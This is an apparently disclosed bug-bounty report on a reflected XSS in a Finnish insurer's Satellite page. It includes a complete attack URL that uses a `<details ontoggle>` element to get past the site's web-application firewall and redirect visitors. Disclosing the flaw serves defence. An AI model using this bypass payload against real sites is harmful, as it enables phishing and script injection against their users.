Summary:
##Issue
The reporter found a reflected XXS in the Satellite server.

##Fix

While the issue was investigated, there were some backend updates done which apparently automatically mysteriously fixed the issue. Poof.

##Reasoning

Based on the report, the issue was found to be valid. Working single click open redirects which are easily usable in phishing attacks are always an issue for us. 
## Basic report information
**Summary:** Reflected XSS vulnerability in `https://www.lahitapiola.fi/cs/Satellite.`

**Description:** There exists a reflected XSS vulnerability in `https://www.lahitapiola.fi/cs/Satellite?pagename=TAMaster/FW_BlogAsset/FW_Nav`. Value of query string parameter `rendermode` is not properly escaped when it is output to the page. The web-application-firewall (WAF) seems to mitigate majority of the simplest XSS vectors, but it is possible to bypass the WAF by using `onToggle` event in `<details>` HTML element. The javascript that is used to demonstrate the vulnerability is `location.href="https://www.google.com/?q="+document.domain`. This demonstrates an open redirect type of vulnerability where user's browser is redirected to the attacker page where the attacker can e.g. perform phishing.

**Domain:** `www.lahitapiola.fi`

## Browsers / Apps Verified In:

  * Firefox version 57.0.3

## Steps To Reproduce:

Access the attack URL `https://www.lahitapiola.fi/cs/Satellite?pagename=TAMaster/FW_BlogAsset/FW_Nav&rendermode=preview"><details%20open=true%20ontoggle=%27location.href="https://www.google.com/?q="%2Bdocument.domain%27><summary>testing</summary></details>`
Browser is redirected to `https://www.google.com/?q=www.lahitapiola.fi`.
